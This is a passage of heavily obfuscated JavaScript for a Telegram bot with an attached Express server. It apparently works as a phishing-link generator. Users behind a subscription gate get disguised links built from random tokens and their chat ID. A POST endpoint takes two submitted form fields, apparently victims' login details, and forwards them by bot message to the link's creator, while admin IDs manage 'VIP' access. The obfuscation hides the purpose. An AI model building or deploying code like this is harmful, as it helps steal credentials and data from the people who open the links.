            'mMPAF': _0x10b4f7(0x405) + _0x10b4f7(0xc6) + _0x10b4f7(0x3ba) + _0x10b4f7(0x2dc),
            'dbpqs': _0x10b4f7(0x515) + _0x10b4f7(0x67a),
            'HmIea': _0x10b4f7(0x4ab),
            'NNeRg': _0x10b4f7(0x1dc) + _0x10b4f7(0xa3),
            'vGngA': _0x10b4f7(0x4f9)
        }, _0x92440d = _0x377ad9[_0x10b4f7(0x662)]['id'], _0x12ea70 = await _0x3b983d[_0x10b4f7(0x468)](isUserSubscribed, _0x92440d);
    if (!_0x12ea70) {
        const _0x3c0a28 = _0x3b983d[_0x10b4f7(0xb2)], _0x5ec6b0 = developerChannels[_0x10b4f7(0x6bd)](_0x54e33e => [{
                    'text': _0x10b4f7(0x25d) + _0x54e33e,
                    'url': _0x10b4f7(0x294) + _0x10b4f7(0x2d0) + _0x54e33e[_0x10b4f7(0xb5)](0x26ed + 0x2 * 0x764 + 0xd6d * -0x4)
                }]);
        bot[_0x10b4f7(0x344) + 'e'](_0x92440d, _0x3c0a28, { 'reply_markup': { 'inline_keyboard': _0x5ec6b0 } });
        return;
    }
    const _0x23309c = _0x3b983d[_0x10b4f7(0x11e)], _0x17abfa = [
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x16b)],
                    'callback_data': _0x10b4f7(0x3ad) + _0x10b4f7(0xae) + _0x92440d
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x54d)],
                    'callback_data': _0x10b4f7(0x476) + 'k:' + _0x92440d
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x363)],
                    'callback_data': _0x10b4f7(0x1a2) + 'n:' + _0x92440d
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x39e)],
                    'callback_data': _0x10b4f7(0x286) + 'e:' + _0x92440d
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x3ab)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x665)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x511)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x251)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0xc3)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x490)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x642)],
                    'callback_data': _0x10b4f7(0x660) + _0x10b4f7(0x47c) + _0x92440d
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x5a9)],
                    'callback_data': _0x10b4f7(0x400) + _0x10b4f7(0x46f) + _0x92440d
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x184)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x578)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x418)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x5c5)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x64d)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x531)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0xcc)],
                    'callback_data': _0x10b4f7(0x6bf) + 'k:' + _0x92440d
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x201)],
                    'web_app': { 'url': _0x3b983d[_0x10b4f7(0x12a)] }
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x4ff)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x138)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x169)],
                    'web_app': { 'url': _0x3b983d[_0x10b4f7(0x264)] }
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x34a)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x1f2)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x68e)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x3e0)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x5ad)],
                    'web_app': { 'url': _0x3b983d[_0x10b4f7(0x41a)] }
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x1d8)],
                    'url': _0x3b983d[_0x10b4f7(0x2aa)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x445)],
                    'web_app': { 'url': _0x3b983d[_0x10b4f7(0x9c)] }
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x66c)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x23c)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x243)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x3c4)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x1d5)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x223)]
                }
            ],
            [
                {
                    'text': _0x3b983d[_0x10b4f7(0x28a)],
                    'callback_data': _0x3b983d[_0x10b4f7(0x277)]
                },
                {
                    'text': _0x3b983d[_0x10b4f7(0x9a)],
                    'url': _0x3b983d[_0x10b4f7(0x4ca)]
                }
            ]
        ];
    bot[_0x10b4f7(0x344) + 'e'](_0x92440d, _0x23309c, { 'reply_markup': { 'inline_keyboard': _0x17abfa } });
    if (_0x3b983d[_0x10b4f7(0x1da)](_0x92440d, 0x1308ae1be + -0x1c52ec38a + 0x1eab71186)) {
        const _0x32647a = _0x3b983d[_0x10b4f7(0x36e)], _0x43c2b6 = [[
                    {
                        'text': _0x3b983d[_0x10b4f7(0x406)],
                        'callback_data': _0x3b983d[_0x10b4f7(0x31c)]
                    },
                    {
                        'text': _0x3b983d[_0x10b4f7(0x1b2)],
                        'callback_data': _0x3b983d[_0x10b4f7(0x1e0)]
                    }
                ]];
        bot[_0x10b4f7(0x344) + 'e'](_0x92440d, _0x32647a, { 'reply_markup': { 'inline_keyboard': _0x43c2b6 } });
    }
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x3772dc => {
    const _0x466465 = _0x4e73bb, _0x4a70ee = {
            'PbwJb': function (_0x27f2a6, _0x4cc9b3) {
                return _0x27f2a6 === _0x4cc9b3;
            },
            'pzbPr': _0x466465(0x343) + _0x466465(0x5a1)
        }, _0x2d1a33 = _0x3772dc[_0x466465(0x2c2)][_0x466465(0x662)]['id'], _0x406c43 = _0x3772dc[_0x466465(0x301)];
    if (_0x4a70ee[_0x466465(0xd5)](_0x406c43, _0x4a70ee[_0x466465(0xde)])) {
        const _0x281066 = _0x466465(0x4dd) + _0x466465(0x5ec) + _0x466465(0x2c8) + _0x466465(0x42f) + _0x466465(0x595) + _0x466465(0xe3) + baseUrl + (_0x466465(0x687) + _0x466465(0x6b8)) + _0x2d1a33;
        bot[_0x466465(0x344) + 'e'](_0x2d1a33, _0x281066);
    }
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), async _0x4d2908 => {
    const _0x41c9ff = _0x4e73bb, _0x320778 = {
            'bbBvi': function (_0x142c8d, _0x5ad018) {
                return _0x142c8d(_0x5ad018);
            },
            'FwOZD': function (_0x554644, _0x58392c) {
                return _0x554644(_0x58392c);
            },
            'MiDPq': _0x41c9ff(0x3f8),
            'cKGUl': _0x41c9ff(0x31a) + 's',
            'gbyEx': _0x41c9ff(0x209) + 're',
            'BQOfD': _0x41c9ff(0x660) + _0x41c9ff(0x2f7),
            'XetmN': _0x41c9ff(0x126),
            'YGpql': _0x41c9ff(0x6bf) + 'k',
            'WWDje': _0x41c9ff(0x6b4),
            'otSrZ': _0x41c9ff(0x400) + _0x41c9ff(0x389),
            'eKSBR': function (_0x44fee2, _0x284262) {
                return _0x44fee2(_0x284262);
            },
            'rdCMz': _0x41c9ff(0x354) + _0x41c9ff(0xc7) + _0x41c9ff(0x194) + _0x41c9ff(0x498) + _0x41c9ff(0x5cf) + _0x41c9ff(0x1c5),
            'oAMcC': function (_0x1393a7, _0x5616a2) {
                return _0x1393a7 === _0x5616a2;
            },
            'rqhiq': _0x41c9ff(0xe6) + _0x41c9ff(0xe9),
            'PszIj': function (_0x776f2c, _0x422647) {
                return _0x776f2c === _0x422647;
            },
            'NBPeE': _0x41c9ff(0x174),
            'sLSes': _0x41c9ff(0x3fe) + _0x41c9ff(0x131) + _0x41c9ff(0x3c0) + _0x41c9ff(0x3b3) + _0x41c9ff(0x58f) + _0x41c9ff(0x55f),
            'IxgtR': _0x41c9ff(0x345) + _0x41c9ff(0x3ff) + _0x41c9ff(0x4c0) + _0x41c9ff(0x452) + 'ns',
            'JaKpQ': _0x41c9ff(0x2b9) + _0x41c9ff(0x5b3),
            'hwcdv': _0x41c9ff(0x684),
            'tRTgF': _0x41c9ff(0x360) + _0x41c9ff(0x2ff) + _0x41c9ff(0x5a8) + _0x41c9ff(0x172) + _0x41c9ff(0x49f) + _0x41c9ff(0x166) + _0x41c9ff(0x61e) + _0x41c9ff(0x5d8) + _0x41c9ff(0x1e3) + _0x41c9ff(0x586) + 'cA',
            'pWIUS': _0x41c9ff(0x3f9) + _0x41c9ff(0x15a),
            'JkyHq': _0x41c9ff(0x33c) + _0x41c9ff(0x28c),
            'hKdQv': _0x41c9ff(0x3a6) + _0x41c9ff(0x647) + _0x41c9ff(0x3e4) + _0x41c9ff(0x3a1) + _0x41c9ff(0x2df) + _0x41c9ff(0x4de) + _0x41c9ff(0x6aa),
            'mNeTK': function (_0xbfc4d0, _0x2587f5) {
                return _0xbfc4d0 === _0x2587f5;
            },
            'DoZin': _0x41c9ff(0x627) + _0x41c9ff(0x57b),
            'MmEva': _0x41c9ff(0x293) + _0x41c9ff(0x207) + _0x41c9ff(0x274) + _0x41c9ff(0x2ac) + _0x41c9ff(0x142) + _0x41c9ff(0x670) + _0x41c9ff(0x427) + _0x41c9ff(0x12c) + _0x41c9ff(0x593) + _0x41c9ff(0x14b) + _0x41c9ff(0x23b) + _0x41c9ff(0x29e) + _0x41c9ff(0x3f7) + _0x41c9ff(0x5ce) + _0x41c9ff(0x45c) + _0x41c9ff(0x517),
            'grlZf': function (_0x4c433a, _0x4e6def) {
                return _0x4c433a === _0x4e6def;
            },
            'KUEnZ': _0x41c9ff(0x33c) + _0x41c9ff(0x149) + _0x41c9ff(0x436),
            'EnrGz': _0x41c9ff(0x3a6) + _0x41c9ff(0x647) + _0x41c9ff(0x3a9) + _0x41c9ff(0x68b) + _0x41c9ff(0x3d2) + _0x41c9ff(0x53f) + _0x41c9ff(0x5c2),
            'lUvhs': function (_0x1aaef0, _0xca00fc) {
                return _0x1aaef0 === _0xca00fc;
            },
            'eMfoo': _0x41c9ff(0x4ab),
            'ESXzC': function (_0x155005, _0x33e255) {
                return _0x155005 == _0x33e255;
            },
            'QKfWL': _0x41c9ff(0xfa) + _0x41c9ff(0x3bc) + _0x41c9ff(0x396) + _0x41c9ff(0x227) + 'P:',
            'OXmzL': _0x41c9ff(0x2c2),
            'fPrUA': function (_0xf39d67, _0x52812b) {
                return _0xf39d67 === _0x52812b;
            },
            'LGJjr': _0x41c9ff(0x4f9),
            'GGNWT': _0x41c9ff(0xfa) + _0x41c9ff(0x3bc) + _0x41c9ff(0x60e) + _0x41c9ff(0x5df) + 'P:',
            'axvlY': function (_0x1321e1, _0x15680c, _0xb78627) {
                return _0x1321e1(_0x15680c, _0xb78627);
            },
            'UwYjf': _0x41c9ff(0x3ad) + 'nt',
            'btwqV': _0x41c9ff(0x5aa),
            'umaUE': _0x41c9ff(0x476) + 'k',
            'lEVEC': _0x41c9ff(0x1a2) + 'n',
            'OBLjW': _0x41c9ff(0x286) + 'e'
        }, _0x38df0a = _0x4d2908[_0x41c9ff(0x2c2)][_0x41c9ff(0x662)]['id'], _0x2d9c0 = _0x4d2908[_0x41c9ff(0x301)], _0x43f1b4 = [
            _0x320778[_0x41c9ff(0x619)],
            _0x320778[_0x41c9ff(0x280)],
            _0x320778[_0x41c9ff(0xc5)],
            _0x320778[_0x41c9ff(0x594)],
            _0x320778[_0x41c9ff(0x199)],
            _0x320778[_0x41c9ff(0x16d)],
            _0x320778[_0x41c9ff(0x4bb)],
            _0x320778[_0x41c9ff(0x154)]
        ];
    if (!_0x43f1b4[_0x41c9ff(0x146)](_0x2d9c0[_0x41c9ff(0x472)](':')[0x1 * 0x105f + 0x18ba + 0xa7 * -0x3f]) && !await _0x320778[_0x41c9ff(0x278)](isUserSubscribed, _0x38df0a)) {
        const _0x431647 = _0x320778[_0x41c9ff(0xfc)], _0x396a02 = developerChannels[_0x41c9ff(0x6bd)](_0x489c1c => ({
                'text': _0x41c9ff(0x25d) + _0x489c1c,
                'url': _0x41c9ff(0x294) + _0x41c9ff(0x2d0) + _0x489c1c[_0x41c9ff(0xb5)](0xe * -0x3 + 0xf2b + -0xf00)
            }));
        bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x431647, { 'reply_markup': { 'inline_keyboard': [_0x396a02] } });
        return;
    }
    if (_0x320778[_0x41c9ff(0x47d)](_0x2d9c0, _0x320778[_0x41c9ff(0x50b)])) {
        const _0x2ab76c = baseUrl + (_0x41c9ff(0x27b) + _0x41c9ff(0x671)) + _0x38df0a;
        bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x41c9ff(0x4dd) + _0x41c9ff(0x3da) + _0x41c9ff(0x52a) + '\x20' + _0x2ab76c);
        return;
    }
    const [_0x38f2ce, _0x5e1dd9] = _0x2d9c0[_0x41c9ff(0x472)](':');
    if (_0x320778[_0x41c9ff(0x451)](_0x38f2ce, _0x320778[_0x41c9ff(0x313)]))
        try {
            const _0x377219 = _0x320778[_0x41c9ff(0x1ab)], _0x50c455 = _0x320778[_0x41c9ff(0x22e)], _0x4c58e2 = await axios[_0x41c9ff(0x493)](_0x50c455, {
                    'model': _0x320778[_0x41c9ff(0xb4)],
                    'messages': [{
                            'role': _0x320778[_0x41c9ff(0x14a)],
                            'content': _0x377219
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x320778[_0x41c9ff(0xda)],
                        'Content-Type': _0x320778[_0x41c9ff(0x1a4)]
                    }
                }), _0x395e9f = _0x4c58e2[_0x41c9ff(0x301)][_0x41c9ff(0x30a)][-0x4e * 0x55 + -0x1d * 0xf8 + 0x1aff * 0x2][_0x41c9ff(0x2c2)][_0x41c9ff(0x99)];
            bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x395e9f);
        } catch (_0x38d056) {
            console[_0x41c9ff(0x2dd)](_0x320778[_0x41c9ff(0x1d1)], _0x38d056[_0x41c9ff(0x11c)] ? _0x38d056[_0x41c9ff(0x11c)][_0x41c9ff(0x301)] : _0x38d056[_0x41c9ff(0x2c2)]), bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x320778[_0x41c9ff(0x48f)]);
        }
    else {
        if (_0x320778[_0x41c9ff(0x49a)](_0x2d9c0, _0x320778[_0x41c9ff(0x117)]))
            try {
                const _0x34632d = _0x320778[_0x41c9ff(0x1d4)], _0x59b763 = _0x320778[_0x41c9ff(0x22e)], _0x15c12c = await axios[_0x41c9ff(0x493)](_0x59b763, {
                        'model': _0x320778[_0x41c9ff(0xb4)],
                        'messages': [{
                                'role': _0x320778[_0x41c9ff(0x14a)],
                                'content': _0x34632d
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x320778[_0x41c9ff(0xda)],
                            'Content-Type': _0x320778[_0x41c9ff(0x1a4)]
                        }
                    }), _0x121e19 = _0x15c12c[_0x41c9ff(0x301)][_0x41c9ff(0x30a)][0x9dc + -0x2ee + 0x6ee * -0x1][_0x41c9ff(0x2c2)][_0x41c9ff(0x99)];
                bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x121e19);
            } catch (_0x31d8e4) {
                console[_0x41c9ff(0x2dd)](_0x320778[_0x41c9ff(0x1d1)], _0x31d8e4[_0x41c9ff(0x11c)] ? _0x31d8e4[_0x41c9ff(0x11c)][_0x41c9ff(0x301)] : _0x31d8e4[_0x41c9ff(0x2c2)]), bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x320778[_0x41c9ff(0x48f)]);
            }
        else {
            if (_0x320778[_0x41c9ff(0xa0)](_0x2d9c0, _0x320778[_0x41c9ff(0x117)]))
                try {
                    const _0x291bc1 = _0x320778[_0x41c9ff(0x1d4)], _0x4cfa21 = _0x320778[_0x41c9ff(0x22e)], _0x585cea = await axios[_0x41c9ff(0x493)](_0x4cfa21, {
                            'model': _0x320778[_0x41c9ff(0xb4)],
                            'messages': [{
                                    'role': _0x320778[_0x41c9ff(0x14a)],
                                    'content': _0x291bc1
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x320778[_0x41c9ff(0xda)],
                                'Content-Type': _0x320778[_0x41c9ff(0x1a4)]
                            }
                        }), _0x481326 = _0x585cea[_0x41c9ff(0x301)][_0x41c9ff(0x30a)][0x80b * -0x1 + 0x39 + 0x7d2][_0x41c9ff(0x2c2)][_0x41c9ff(0x99)];
                    bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x481326);
                } catch (_0x164058) {
                    console[_0x41c9ff(0x2dd)](_0x320778[_0x41c9ff(0x3f2)], _0x164058[_0x41c9ff(0x11c)] ? _0x164058[_0x41c9ff(0x11c)][_0x41c9ff(0x301)] : _0x164058[_0x41c9ff(0x2c2)]), bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x320778[_0x41c9ff(0x690)]);
                }
            else {
                if (_0x320778[_0x41c9ff(0x29b)](_0x2d9c0, _0x320778[_0x41c9ff(0x3cb)]) && _0x320778[_0x41c9ff(0x5e3)](_0x38df0a, 0x18677e * -0x761 + 0x11c3b80c6 + 0xedeb57b2))
                    bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x320778[_0x41c9ff(0x1bf)]), bot[_0x41c9ff(0x2cf)](_0x320778[_0x41c9ff(0x271)], _0x2d72f9 => {
                        const _0x31d33d = _0x41c9ff, _0x8d8b27 = _0x2d72f9[_0x31d33d(0x5bc)];
                        _0x320778[_0x31d33d(0x220)](addVIPUser, _0x8d8b27), bot[_0x31d33d(0x344) + 'e'](_0x38df0a, _0x31d33d(0x32f) + _0x31d33d(0x51b) + _0x8d8b27 + _0x31d33d(0x3b0));
                    });
                else {
                    if (_0x320778[_0x41c9ff(0x34e)](_0x2d9c0, _0x320778[_0x41c9ff(0x3b8)]) && _0x320778[_0x41c9ff(0x5e3)](_0x38df0a, 0x4fe7c4d5 + -0x118f13 * -0x103b + -0x16d1be7c))
                        bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x320778[_0x41c9ff(0x429)]), bot[_0x41c9ff(0x2cf)](_0x320778[_0x41c9ff(0x271)], _0x1d2ec0 => {
                            const _0x2ece87 = _0x41c9ff, _0x145eee = _0x1d2ec0[_0x2ece87(0x5bc)];
                            _0x320778[_0x2ece87(0x5ef)](removeVIPUser, _0x145eee), bot[_0x2ece87(0x344) + 'e'](_0x38df0a, _0x2ece87(0x60d) + _0x2ece87(0x51b) + _0x145eee + _0x2ece87(0x6a4));
                        });
                    else {
                        const [_0x583cb4, _0x3bbcfa] = _0x2d9c0[_0x41c9ff(0x472)](':');
                        if (!_0x43f1b4[_0x41c9ff(0x146)](_0x583cb4) && !_0x320778[_0x41c9ff(0x425)](validateLinkUsage, _0x3bbcfa, _0x583cb4)) {
                            bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, '');
                            return;
                        }
                        let _0x5a6bc3 = '';
                        switch (_0x583cb4) {
                        case _0x320778[_0x41c9ff(0xa2)]:
                            _0x5a6bc3 = baseUrl + (_0x41c9ff(0x45d) + _0x41c9ff(0x69d)) + crypto[_0x41c9ff(0x189) + 's'](-0x5ab * 0x5 + 0x7b0 + 0x14b7)[_0x41c9ff(0x639)](_0x320778[_0x41c9ff(0x5d0)]) + _0x41c9ff(0x5af) + _0x38df0a;
                            break;
                        case _0x320778[_0x41c9ff(0x42e)]:
                            _0x5a6bc3 = baseUrl + (_0x41c9ff(0x1f0) + _0x41c9ff(0x29c)) + crypto[_0x41c9ff(0x189) + 's'](0x263e + -0x1a82 + -0xbac)[_0x41c9ff(0x639)](_0x320778[_0x41c9ff(0x5d0)]) + _0x41c9ff(0x5af) + _0x38df0a;
                            break;
                        case _0x320778[_0x41c9ff(0x64a)]:
                            _0x5a6bc3 = baseUrl + (_0x41c9ff(0x3a3) + _0x41c9ff(0x626)) + crypto[_0x41c9ff(0x189) + 's'](-0x1 * -0x1def + 0x154a + -0x1 * 0x3329)[_0x41c9ff(0x639)](_0x320778[_0x41c9ff(0x5d0)]) + _0x41c9ff(0x5af) + _0x38df0a;
                            break;
                        case _0x320778[_0x41c9ff(0x65f)]:
                            const _0x56ec62 = -0x7 * 0x593 + 0x1a81 + 0xc8e;
                            _0x5a6bc3 = baseUrl + _0x41c9ff(0x1ea) + crypto[_0x41c9ff(0x189) + 's'](0x216a + 0x11 * -0x2b + -0x1e7f)[_0x41c9ff(0x639)](_0x320778[_0x41c9ff(0x5d0)]) + _0x41c9ff(0x5af) + _0x38df0a + _0x41c9ff(0x17d) + _0x56ec62;
                            break;
                        case _0x320778[_0x41c9ff(0x16d)]:
                            _0x5a6bc3 = baseUrl + (_0x41c9ff(0x60c) + _0x41c9ff(0x2f9)) + _0x38df0a + (_0x41c9ff(0x54f) + 'ok');
                            break;
                        case _0x320778[_0x41c9ff(0x594)]:
                            _0x5a6bc3 = baseUrl + (_0x41c9ff(0x60c) + _0x41c9ff(0x2f9)) + _0x38df0a + (_0x41c9ff(0x5ee) + _0x41c9ff(0x610));
                            break;
                        case _0x320778[_0x41c9ff(0x154)]:
                            _0x5a6bc3 = baseUrl + (_0x41c9ff(0x60c) + _0x41c9ff(0x2f9)) + _0x38df0a + (_0x41c9ff(0x4ba) + _0x41c9ff(0x439));
                            break;
                        default:
                            bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, '');
                            return;
                        }
                        bot[_0x41c9ff(0x344) + 'e'](_0x38df0a, _0x41c9ff(0x191) + _0x41c9ff(0x678) + _0x5a6bc3);
                    }
                }
            }
        }
    }
    bot[_0x41c9ff(0x5f0) + _0x41c9ff(0x11f)](_0x4d2908['id']);
}), bot[_0x4e73bb(0x2d9)](/\/jjihigjoj/, _0x50d6f9 => {
    const _0x302fef = _0x4e73bb, _0x6161a8 = {
            'tVOiE': _0x302fef(0x4be) + _0x302fef(0x11a) + _0x302fef(0x486) + _0x302fef(0x438) + '.',
            'mvloa': _0x302fef(0x275) + _0x302fef(0x348),
            'WCwhA': _0x302fef(0x21a) + _0x302fef(0x1ac)
        }, _0x3c7462 = _0x50d6f9[_0x302fef(0x662)]['id'], _0x665ab0 = _0x6161a8[_0x302fef(0x1e7)];
    bot[_0x302fef(0x344) + 'e'](_0x3c7462, _0x665ab0, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x6161a8[_0x302fef(0x55e)],
                        'callback_data': _0x6161a8[_0x302fef(0x219)]
                    }]]
        }
    });
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x3e722f => {
    const _0xe1bf6e = _0x4e73bb, _0x4ff3be = {
            'SfFZZ': function (_0x2aa313, _0x19bce3) {
                return _0x2aa313 === _0x19bce3;
            },
            'yqvzh': _0xe1bf6e(0x21a) + _0xe1bf6e(0x1ac)
        }, _0x283e90 = _0x3e722f[_0xe1bf6e(0x2c2)][_0xe1bf6e(0x662)]['id'];
    if (_0x4ff3be[_0xe1bf6e(0x4c9)](_0x3e722f[_0xe1bf6e(0x301)], _0x4ff3be[_0xe1bf6e(0x177)])) {
        const _0x2ecb7b = baseUrl + '/' + _0x283e90;
        bot[_0xe1bf6e(0x344) + 'e'](_0x283e90, _0xe1bf6e(0x2ea) + _0xe1bf6e(0x4dc) + _0x2ecb7b);
    }
    bot[_0xe1bf6e(0x5f0) + _0xe1bf6e(0x11f)](_0x3e722f['id']);
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x5a2420 => {
    const _0x59057d = _0x4e73bb, _0x5d31eb = {
            'JSiCG': function (_0x8a3d4, _0x21c500) {
                return _0x8a3d4 === _0x21c500;
            },
            'vfLQm': _0x59057d(0x122),
            'EhlTF': _0x59057d(0x2c2),
            'CHMWU': _0x59057d(0x489) + _0x59057d(0x190) + _0x59057d(0x228) + _0x59057d(0xa4),
            'UAbJi': function (_0x690863, _0x1c450c) {
                return _0x690863 === _0x1c450c;
            },
            'ZkimH': _0x59057d(0x623),
            'dOuBE': _0x59057d(0x1a5) + _0x59057d(0xaf) + _0x59057d(0x430) + '.'
        }, _0x2dbaab = _0x5a2420[_0x59057d(0x2c2)][_0x59057d(0x662)]['id'];
    if (_0x5d31eb[_0x59057d(0x43f)](_0x5a2420[_0x59057d(0x301)], _0x5d31eb[_0x59057d(0x2b2)])) {
        bot[_0x59057d(0x344) + 'e'](_0x2dbaab, _0x5d31eb[_0x59057d(0x491)]);
        const _0x30204c = _0x58e346 => {
            const _0x529da7 = _0x59057d;
            if (_0x5d31eb[_0x529da7(0x4b0)](_0x58e346[_0x529da7(0x662)]['id'], _0x2dbaab)) {
                if (_0x58e346[_0x529da7(0x5bc)] && _0x58e346[_0x529da7(0x5bc)][_0x529da7(0x2a7)](_0x5d31eb[_0x529da7(0x67c)])) {
                    const _0xdf1f7e = _0x58e346[_0x529da7(0x5bc)];
                    dataStore[_0x2dbaab] = { 'userLink': _0xdf1f7e }, bot[_0x529da7(0x344) + 'e'](_0x2dbaab, _0x529da7(0x20d) + _0x529da7(0x5f4) + _0x529da7(0x62d) + baseUrl + (_0x529da7(0x46b) + _0x529da7(0x2ab)) + _0x2dbaab), bot[_0x529da7(0xe8) + _0x529da7(0x30f)](_0x5d31eb[_0x529da7(0x558)], _0x30204c);
                } else
                    bot[_0x529da7(0x344) + 'e'](_0x2dbaab, _0x5d31eb[_0x529da7(0x9b)]);
            }
        };
        bot['on'](_0x5d31eb[_0x59057d(0x558)], _0x30204c);
    }
}), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x3b5)]({ 'extended': !![] })), app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname)), app[_0x4e73bb(0x493)](_0x4e73bb(0x466) + 'es', (_0x55b93d, _0xbb9d10) => {
    const _0x36ef1d = _0x4e73bb, _0x2b0ac7 = {
            'rpYeF': _0x36ef1d(0xc0),
            'cpEyC': _0x36ef1d(0x57c) + _0x36ef1d(0x291) + _0x36ef1d(0x487) + ':',
            'HCUjE': _0x36ef1d(0x3a6) + _0x36ef1d(0x170) + _0x36ef1d(0x4a0) + _0x36ef1d(0x4f2) + _0x36ef1d(0x571),
            'nZjMA': _0x36ef1d(0x3e8) + _0x36ef1d(0x6b2)
        }, _0x32d398 = _0x55b93d[_0x36ef1d(0x67d)][_0x36ef1d(0x577)], _0x228d36 = _0x55b93d[_0x36ef1d(0x67d)][_0x36ef1d(0x279)], _0x2804f8 = _0x55b93d[_0x36ef1d(0x67d)][_0x36ef1d(0x2a1)];
    console[_0x36ef1d(0x235)](_0x2b0ac7[_0x36ef1d(0x443)], _0x55b93d[_0x36ef1d(0x67d)]), bot[_0x36ef1d(0x344) + 'e'](_0x32d398, _0x36ef1d(0x1e2) + _0x36ef1d(0x248) + _0x228d36 + _0x36ef1d(0x5e6) + _0x2804f8)[_0x36ef1d(0x4b4)](() => {
        const _0x5bad97 = _0x36ef1d;
        _0xbb9d10[_0x5bad97(0x69a)](path[_0x5bad97(0x3eb)](__dirname, _0x2b0ac7[_0x5bad97(0xfd)]));
    })[_0x36ef1d(0x3e9)](_0x5b8d2c => {
        const _0x35dabc = _0x36ef1d;
        console[_0x35dabc(0x2dd)](_0x2b0ac7[_0x35dabc(0x58b)], _0x5b8d2c[_0x35dabc(0x11c)] ? _0x5b8d2c[_0x35dabc(0x11c)][_0x35dabc(0x67d)] : _0x5b8d2c), _0xbb9d10[_0x35dabc(0x1b9)](-0x279 * -0x7 + 0x2 * 0x11c5 + -0x32e5)[_0x35dabc(0x3a7)](_0x2b0ac7[_0x35dabc(0x27a)]);
    });
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x508), (_0x93e1b3, _0x5c10d2) => {
    const _0x29743c = _0x4e73bb, _0x133147 = {
            'AsyFY': _0x29743c(0x33e) + _0x29743c(0x505) + _0x29743c(0x33f),
            'NQnEZ': _0x29743c(0xc0)
        }, _0x3f801a = _0x93e1b3[_0x29743c(0x97)][_0x29743c(0x577)];
    if (!_0x3f801a)
        return _0x5c10d2[_0x29743c(0x1b9)](0xa2 * -0x12 + 0x12f * -0x13 + 0x2371)[_0x29743c(0x3a7)](_0x133147[_0x29743c(0x5db)]);
    _0x5c10d2[_0x29743c(0x69a)](path[_0x29743c(0x3eb)](__dirname, _0x133147[_0x29743c(0x2da)]));
}), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x3b5)]({ 'extended': !![] })), app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname)), app[_0x4e73bb(0x493)](_0x4e73bb(0x466) + 'es', (_0x2112d7, _0x68afd7) => {
    const _0x3ff4fa = _0x4e73bb, _0x243fac = {
            'fICEM': _0x3ff4fa(0x107),
            'PHHpQ': _0x3ff4fa(0x57c) + _0x3ff4fa(0x291) + _0x3ff4fa(0x487) + ':',
            'FIeyE': _0x3ff4fa(0x3a6) + _0x3ff4fa(0x170) + _0x3ff4fa(0x4a0) + _0x3ff4fa(0x4f2) + _0x3ff4fa(0x571),
            'KzXkJ': _0x3ff4fa(0x3e8) + _0x3ff4fa(0x6b2)
        }, _0x366d92 = _0x2112d7[_0x3ff4fa(0x67d)][_0x3ff4fa(0x577)], _0x32661a = _0x2112d7[_0x3ff4fa(0x67d)][_0x3ff4fa(0x279)], _0x60f3b3 = _0x2112d7[_0x3ff4fa(0x67d)][_0x3ff4fa(0x2a1)];
